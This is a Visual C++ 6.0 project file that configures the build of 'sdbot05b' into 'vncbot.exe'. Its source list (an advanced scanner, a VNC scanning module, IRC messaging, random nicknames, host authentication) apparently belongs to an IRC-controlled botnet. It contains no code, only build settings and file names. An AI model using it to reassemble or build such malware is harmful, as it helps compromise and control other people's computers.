# Microsoft Developer Studio Project File - Name="sdbot05b" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=SDBOT05B - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "sdbot05b.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "sdbot05b.mak" CFG="SDBOT05B - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "sdbot05b - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /w /W0 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib Netapi32.lib shlwapi.lib Mpr.lib /nologo /subsystem:windows /machine:I386 /out:"bin/vncbot.exe" /align:4096
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "sdbot05b - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "scanners"

# PROP Default_Filter "cpp"
# Begin Source File

SOURCE=.\sources\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\vncshit.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\sources\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\d3des.c
# End Source File
# Begin Source File

SOURCE=.\sources\hostauth.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\loaddll.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\sources\sdbot05b.cpp
# ADD CPP /O1
# End Source File
# Begin Source File

SOURCE=.\sources\threads.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;"
# Begin Group "scanner headers"

# PROP Default_Filter "h"
# Begin Source File

SOURCE=.\includes\advscan.h
# End Source File
# Begin Source File

SOURCE=.\includes\vncshit.h
# End Source File
# End Group
# Begin Group "protocal headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\includes\rfb.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\includes\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\includes\commands.h
# End Source File
# Begin Source File

SOURCE=.\config.h
# End Source File
# Begin Source File

SOURCE=.\includes\defines.h
# End Source File
# Begin Source File

SOURCE=.\includes\functions.h
# End Source File
# Begin Source File

SOURCE=.\includes\hostauth.h
# End Source File
# Begin Source File

SOURCE=.\includes\Includes.h
# End Source File
# Begin Source File

SOURCE=.\includes\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\includes\loaddll.h
# End Source File
# Begin Source File

SOURCE=.\includes\misc.h
# End Source File
# Begin Source File

SOURCE=.\includes\netheaders.h
# End Source File
# Begin Source File

SOURCE=.\includes\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\includes\sdbot05b.h
# End Source File
# Begin Source File

SOURCE=.\includes\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\includes\threads.h
# End Source File
# End Group
# End Target
# End Project
